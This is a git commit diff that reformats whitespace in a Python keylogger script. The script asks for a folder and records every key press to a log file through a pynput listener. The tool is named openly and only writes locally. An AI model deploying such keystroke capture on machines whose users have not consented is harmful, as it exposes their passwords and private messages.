13825ba9c2a379fbe6445521c4a9275f459fe25d
matiassgg <matugrillo@hotmail.com>
2021-08-12 22:14:24 -0300

    Minor fix on spaces

--- KeyLogger/keylogger.py
+++ KeyLogger/keylogger.py
@@ -4,9 +4,7 @@ from pynput.keyboard import Listener
 
 def config_path():
     path = input("Specify the folder to save the log file:")
-    logging.basicConfig(filename=f'{path}/log.txt',
-                        format='%(asctime)s: %(message)s',
-                        level=logging.DEBUG)
+    logging.basicConfig(filename=f'{path}/log.txt', format='%(asctime)s: %(message)s',level=logging.DEBUG)
 
 
 def key_recorder(key):
@@ -17,3 +15,4 @@ if __name__ == '__main__':
     config_path()
     with Listener(on_press=key_recorder) as listener:
         listener.join()
+
